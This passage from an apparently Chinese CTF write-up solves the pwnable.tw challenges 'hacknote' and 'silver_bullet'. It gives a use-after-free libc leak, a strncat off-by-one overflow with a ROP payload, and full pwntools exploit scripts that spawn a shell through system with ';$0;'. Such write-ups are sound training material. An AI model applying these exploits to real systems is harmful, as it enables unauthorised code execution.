</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>泄露可以通过，没有限制<code>chunk</code>的大小进行申请一个大过<code>fastbin</code>大小的<code>chunk</code>进行<code>free</code>，得到<code>unsortedbin</code>的<code>fd</code>和<code>bk</code>互指，进行一个<code>uaf</code>利用。泄露出<code>libc</code>地址</p> <p>第二种泄露方式是利用<code>puts_got</code>进行打印出<code>libc</code>地址。</p> <p>利用方式：</p> <p>由于开头每次创建<code>chunk</code>时，他会自己给你创建一个大小为<strong>8+0x10</strong><code>note_head</code>。(由于heap创建后大小被抬高)，然后创建两个<code>chunk</code></p> <table><thead><tr><th style="text-align:center;">heap</th></tr></thead> <tbody><tr><td style="text-align:center;">chunk_head_0(size = 0x18)</td></tr> <tr><td style="text-align:center;">chunk_0(size = 0x80)</td></tr> <tr><td style="text-align:center;">chunk_head_1(size = 0x18)</td></tr> <tr><td style="text-align:center;">chunk_1(size = 0x80)</td></tr></tbody></table> <p><code>free</code>过后</p> <table><thead><tr><th style="text-align:center;">heap</th></tr></thead> <tbody><tr><td style="text-align:center;">chunk_2(size = 0x18)</td></tr> <tr><td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">chunk_2(size = 0x18)</td></tr> <tr><td style="text-align:center;"></td></tr></tbody></table> <p>利用<code>uaf</code>能控制上面的<code>chunk_head</code>然后写入<code>system+sh/$0</code>就可以<code>getshell</code></p> <h4 id="exp-6"><a href="#exp-6" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token number">32</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x08048A43</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Your choice :&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Note size :&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;Content :&quot;</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delt</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Index :&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Index :&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

print_data <span class="token operator">=</span> <span class="token number">0x0804862B</span>
puts_got <span class="token operator">=</span> <span class="token number">0x0804A024</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'Sh4oBa1'</span><span class="token punctuation">)</span>    <span class="token comment">#chunk0</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'Sh4oBa1'</span><span class="token punctuation">)</span>    <span class="token comment">#chunk1</span>
    delt<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>           <span class="token comment">#chunk2</span>
    show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x61</span>
    libc_addr <span class="token operator">=</span> addr  <span class="token operator">-</span> <span class="token number">0x001b0700</span>
    slog<span class="token punctuation">[</span><span class="token string">'libc_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> libc_addr
    system <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    slog<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">=</span> system
    <span class="token comment">#bin_sh = libc_addr + next(libc.search(b'/bin/sh\x00'))</span>
    <span class="token comment">#slog['bin_sh'] = bin_sh</span>

    gdba<span class="token punctuation">(</span><span class="token punctuation">)</span>
    delt<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    delt<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span>system<span class="token punctuation">,</span><span class="token string">b';$0;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#“||sh”也可以</span>
    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>



context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span> <span class="token number">10102</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;/ctf/work/pwnable/hacknote/libc.so.6&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br></div></div></details> <h2 id="silver-bullet"><a href="#silver-bullet" class="header-anchor">#</a> silver_bullet</h2> <h4 id="分析-7"><a href="#分析-7" class="header-anchor">#</a> 分析</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/f/pwnable.tw/silver_bullet/silver_bullet'</span>
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>无PIE和canary</strong></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">create_bullet</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>Bullet<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token class-name">size_t</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-4h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>Bullet <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;You have been created the Bullet !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Give me your description of bullet :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read_input</span><span class="token punctuation">(</span>Bullet<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 0x30个输入</span>
  v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Bullet<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Your power is : %u\n&quot;</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>Bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Good luck !!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> __cdecl <span class="token function">power_up</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>num_bullet<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-34h] BYREF</span>
  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-4h]</span>

  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>num_bullet <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;You need create the bullet first !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>num_bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0x2Fu</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;You can't power up any more !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Give me your another description of bullet :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read_input</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x30</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span>num_bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strncat</span><span class="token punctuation">(</span>num_bullet<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x30</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span>num_bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 衔接,漏洞利用点</span>
  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>num_bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Your new power is : %u\n&quot;</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>num_bullet <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Enjoy it !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>主要漏洞点在<code>strncat()</code>在调试的时候可以发现，他在栈上利用末尾添加的<code>\x00</code>重新修改子弹输入数。</p> <p>通过后面输入只要比<code>0x7FFFFFFF</code>大的数就行，然后正常利用<code>puts_got</code>进行泄露<code>libc</code>地址。</p> <h4 id="exp-7"><a href="#exp-7" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token number">32</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x08048989</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Your choice :&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;Give me your description of bullet :&quot;</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;Give me your another description of bullet :&quot;</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    puts_plt <span class="token operator">=</span> <span class="token number">0x080484A8</span>
    main <span class="token operator">=</span> <span class="token number">0x08048954</span>
    atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&quot;atoi&quot;</span><span class="token punctuation">]</span>

    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x2f</span><span class="token punctuation">)</span> <span class="token comment">#add 1</span>
    edit<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span> <span class="token comment">#power_up</span>
    
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b'\x9f'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">,</span>puts_plt<span class="token punctuation">,</span>main<span class="token punctuation">,</span>atoi_got<span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    hit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;Oh ! You win !!\n&quot;</span><span class="token punctuation">)</span>
    libc_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>
    slog<span class="token punctuation">[</span><span class="token string">'libc_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> libc_addr
    system <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    slog<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">=</span> system
